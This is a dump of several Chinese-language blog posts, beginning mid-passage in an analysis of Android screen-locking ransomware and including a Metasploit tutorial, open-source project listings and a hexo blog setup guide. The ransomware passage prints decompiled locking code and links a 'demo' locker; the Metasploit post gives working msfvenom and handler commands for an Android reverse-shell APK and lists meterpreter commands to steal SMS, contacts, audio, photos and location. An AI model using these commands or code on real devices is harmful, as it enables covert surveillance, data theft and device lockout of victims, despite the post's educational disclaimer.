paramContext.startService(localIntent); getManager(paramContext).resetPassword(str, 0); super.onEnabled(paramContext, paramIntent); return; &#125; catch (ClassNotFoundException localClassNotFoundException) &#123; localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage()); &#125; throw localNoClassDefFoundError; &#125; 用户只要一点击激活，那么就会设置一个密码为1997的锁屏密码，并且开启s这个服务。跟进看看这个服务做了些什么。s里面杂乱代码太多，我们直接来看主要的。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465private void c()&#123; WindowManager.LayoutParams localLayoutParams = new WindowManager.LayoutParams(); this.wmParams = localLayoutParams; Application localApplication = getApplication(); getApplication(); this.mWindowManager = ((WindowManager)localApplication.getSystemService(Context.WINDOW_SERVICE)); this.wmParams.type = 2010; this.wmParams.format = 1; this.wmParams.flags = 1280; this.wmParams.gravity = 49; this.wmParams.x = 0; this.wmParams.y = 0; this.wmParams.width = -1; this.wmParams.height = -1; this.mFloatLayout = LayoutInflater.from(getApplication()).inflate(2130903041, (ViewGroup)null); MediaPlayer localMediaPlayer = MediaPlayer.create(this, 2131099648); localMediaPlayer.setLooping(true); localMediaPlayer.start(); this.mWindowManager.addView(this.mFloatLayout, this.wmParams); this.bt = ((Button)this.mFloatLayout.findViewById(2131361794)); this.ed = ((EditText)this.mFloatLayout.findViewById(2131361792)); this.tv = ((TextView)this.mFloatLayout.findViewById(2131361793)); try &#123; this.ed.setHint(\"宝贝在这输入密码！\"); this.tv.append(\"恭喜中奖\"); Button localButton = this.bt; 100000001 local100000001 = new View.OnClickListener() &#123; @Override public void onClick(View paramView) &#123; try &#123; if (s.this.ed.getText().toString().equals(s.this.des.decrypt(s.this.share.getString(\"passw\", \"\")))) &#123; s.access$L1000001(s.this).removeView(s.access$L1000002(s.this)); s.this.stopSelf(); &#125; return; &#125; catch (Exception localException) &#123; &#125; &#125; &#125;; localButton.setOnClickListener(local100000001); &#125; catch (Exception localException1) &#123; try &#123; TextView localTextView = this.tv; StringBuffer localStringBuffer1 = new StringBuffer(); StringBuffer localStringBuffer2 = new StringBuffer(); localTextView.append(localStringBuffer2.append(\"\\n\").append(this.des.decrypt(\"e60b6ba97b41a1c7a31f1228d55280a8243703be7d4aa15c\")).toString() + this.share.getLong(\"m\", 0)); return; localException1 = localException1; &#125; catch (Exception localException2) &#123; &#125; &#125;&#125; 把一个布局文件全屏显示在屏幕中，以及设置组件的文字，大小，DES加密等。重点：布局文件的type和flags属性。可以让这个View一直显示在栈的顶端，任何其他view都会在这个view的下面，导致锁屏的假象。 总结 这个锁机程序的运行流传，打开，把so文件改成apk文件防盗/system/app目录，重启，apk自启动，设置view到栈的顶端。由于已经是系统应用了，所以双清也清除不了 解决办法。 手机必须是开启usb调试，连接电脑adb shell进入手机base shell，进入/system/app目录，源码中的命令有说把该目录弄成可读可写，我们就借用那个命令，然后再把恶意app删掉即可rm -fr xx.apk，最后reboot重启。 末尾 为了不让恶意程序流传，我就不分享源程序了。不过我写了一个锁屏的demo，仅仅打开后仅仅锁屏1分钟然后退出，并无其他恶意操作。链接：https://share.weiyun.com/53c25ac04fcc5fd02b683458cddffff1 （密码：OTdFKW）","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"反编译","slug":"反编译","permalink":"http://y00z.github.io/tags/反编译/"}]},{"title":"安卓源码三连发","date":"2017-01-06T06:11:27.000Z","path":"2017/01/06/安卓源码三连发/","text":"前言 早在高三的时候,我就决定不再弄啥网络安全了,想从事开发的工作.当时正好移动设备特别火,所以决定入坑安卓开发了.当时给自己定下的目标是先学习java，javaweb，然后是android. 学习期间自己也试着开发了几个项目，这里开源出来和大家分享一下，希望能和大家共同学习. 手机安全卫士 https://github.com/Y00z/android_security 新闻客户端 https://github.com/Y00z/android_news 应用市场 https://github.com/Y00z/android_googlePlay 尾声 移动开发从火爆到现在，个人觉得现在的安卓原生已经完全饱和了.门槛不高，第三方框架和解决方案太多太多了.个人目前正在学习研究nodejs，react-native，python.欢迎志向相同的朋友交流一起学习","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"}]},{"title":"node开发电影站项目","date":"2016-12-20T08:45:59.000Z","path":"2016/12/20/node开发电影站项目/","text":"NodeJs + MongoDb + express4搭建电影站简介 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习nodejs也有一段时间了，本项目是一个非常简单的前端后端结合的nodejs项目，代码非常简洁明了，适合初识nodejs的同学了解和学习。另外感谢Scott大哥提供的学习资料素材。 数据库 MongoDb web框架 express4 前端 ejs 构建 grunt 前端 观看电影，查看电影详情，以及评论，还有分页搜索,登录退出等。 后端 对电影和分类进行添加和编辑以及删除，也可以添加删除用户,持久化session等。同时接入了豆瓣电影的api，只需把豆瓣电影里的电影序号粘贴到豆瓣同步中，即可自动添加电影。需要用户的role大于50也就是管理员权限才可以访问后台 运行* npm install * grunt 首页 添加电影 电影列表 分页 搜索 项目地址https://github.com/Y00z/nodejs_movie","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"nodejs","slug":"nodejs","permalink":"http://y00z.github.io/tags/nodejs/"}]},{"title":"msf渗透android并植入后门","date":"2016-12-19T07:32:08.000Z","path":"2016/12/19/msf渗透android并植入后门/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 。团队合作，在Metasploit和综合报告提出了他们的发现。 环境 BackBox、kali linux、或者BackTrack(kali linux的前身) 一台安卓设备 环境不说太多介绍了，直接来实战。 生成payload装好环境后查看自己的ip 生成一个payload msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk p 设置要使用的payload LHOST 设置用来接收反弹连接的主机 LPORT 设置用来接收反弹连接的端口 很小，才8kb如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。生成的apk放到手机上安装，安装完成后是这样的。 反弹shell 启动msf依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致) * use exploit/multi/handler * set payload android/meterpreter/reverse_tcp * set LHOST 192.168.0.18 * set LPORT 2333 设置完毕后就可以输入 exploit 来执行攻击了 可以看到msf会一直在监听本机的2333端口，等待着目标连接上线然后我打开我们刚刚安装的打开后会连接到msf这样我们就拿到了手机的shell 控制指令 我来介绍几个有意思的指令。 * check_root #查看是否root * dump_calllog #下载通讯记录 * dump_contacts #下载联系人 * dump_sms #下载短信 * send_sms #发送短信 * record_mic #录音 * webcam_list #查看手机摄像头 * webcam_snap #拍照 * webcam_stream #连续拍照 * geolocate #获取目标地理位置 * upload #上传文件到手机 * download #下载手机上的文件 * shell #进入手机的bash shell check_root(检测root) 是root的设备 dump_contacts(下载联系人) 57个联系人 dump_sms(下载短信) 1271条短信 send_sms(发送短信) -d目标电话号码 -t 短信内容 record_mic(录音) -d 录音的秒数音频文件会自动保存在/var/www/html/目录下 webcam_list(检测摄像头) 2:前置摄像头1:后置摄像头 webcam_snap(拍照) -i 选择使用哪个摄像头拍照手机息屏的时候也可以拍照 webcam_stream(连续拍照) -i 指定摄像头 -d 拍照间隔(默认1800毫秒)使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片 geolocate(获取地理位置) upload(上传文件到手机) download(下载文件到手机) shell(进入手机bash shell) ###最后 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"hexo+github搭建免费个人博客","date":"2016-12-14T17:06:22.000Z","path":"2016/12/15/hexo-github搭建免费个人博客/","text":"前言 一直想着有时间就把自己会的技术分享出来，可是一直拖啊拖，这次搭建了个博客，决心要share出来。 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托 管在github和Heroku上，引用Hexo作者 @tommy351 的话：快速、简单且功能强大的 Node.js 博客框架。A fast, simple &amp; powerful blog framework, powered by Node.js. 一,搭建平台配置环境 安装Node（必须） 安装Git（必须） 申请github帐号（必须） 这三个就不用多说了。 配置github &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在github中创建仓库，仓库名必须和用户名对应 【your_user_name.github.io】，固定写法，如我们的github名叫zhangsan那么我们创建的仓库名是zhangsan.github.io。创建完毕后进入新建的仓库页面。右侧有一个setting 往下拉有个launch automatic page generator 输入标题和内容 完成后选择样式主题 选择完毕就可以点publish page我们的博客就已经完成了最后来查看效果https://zhangsan.github.io/ 二,hexo生成博客安装hexo* npm install -g hexo * npm install hexo-deployer-git --save 安装成功后输入命令 hexo init blogname ， 来初始化一个hexo博客,同时会新建blogname的文件夹，里面存放的就是我们博客的所有文件了 设置主题 主题: https://hexo.io/themes/ 找到我们需要的主题对应的github仓库，我们 cd blogname 切换到博客文件夹中 * git clone https://github.com/iissnan/hexo-theme-next.git themes/next 把hexo主题克隆到博客文件夹中。然后再打开博客主页中的_config.yml，找到theme,后面加上我们主题的名字如theme: next最后运行hexo s可以来查看效果了浏览器输入 http://localhost:4000查看效果。 三,同步github设置ssh key 首先进入到C:\\Users\\username\\.ssh文件夹中，把里面文件都删掉然后输入命令输入bash(配置git环境才有),进入bash shell再来依次输入命令生成ssh * ssh-keygen -t rsa -C your_github_email@163.com(提示输入密码不用理,直接回车) * ssh-agent –s * ssh-add ~/.ssh/id_rsa * eval `ssh-agent -s * ssh-add 如果输出了ssh目录呢,就说明生成成功了 进入C:\\Users\\username\\.ssh目录,id_rsa.pub文件就是我们的key。 github设置ssh key 打开github的setting下面有一个SSH and GPG keys然后New ssh key，就可以输入标题和key了标题随意，key就是C:\\Users\\username\\.ssh\\id_rsa.pub中的内容，全部复制粘贴过去。Add SSH key 就ok了 测试 在bash shell中输入ssh git@github.com 注意：提示yes or no的话，一定要输入yes，千万别直接回车。如果回馈了我们github的用户名就说明连接成功了，可以直接部署到github上面了 hexo同步到github 打开blog文件夹中的_config.yml,在最后一行加上 * deploy: * type: git * repository: https://github.com/Y00z/y00z.github.io.git * branch: master repository中的地址是上面创建的仓库的地址 注意:type: 和repository: 以及branch:冒号后面有一个空格。最后hexo就可以同步到github上了每次同步到github的命令行 hexo clean &amp;&amp; hexo g &amp;&amp; hexo d最后户可以进入your_github_name.github.io 查看效果了。 其他更新 更新hexo： npm update -g hexo 更新主题： cd themes/你的主题 git pull 更新插件： npm update hexo命令 hexo new “postName” #新建文章 hexo new page “pageName” #新建页面 hexo generate #生成静态页面至public目录 hexo server #开启预览访问端口 hexo deploy #将.deploy目录部署到GitHub hexo clean #清除缓存","tags":[{"name":"hexo","slug":"hexo","permalink":"http://y00z.github.io/tags/hexo/"}]}]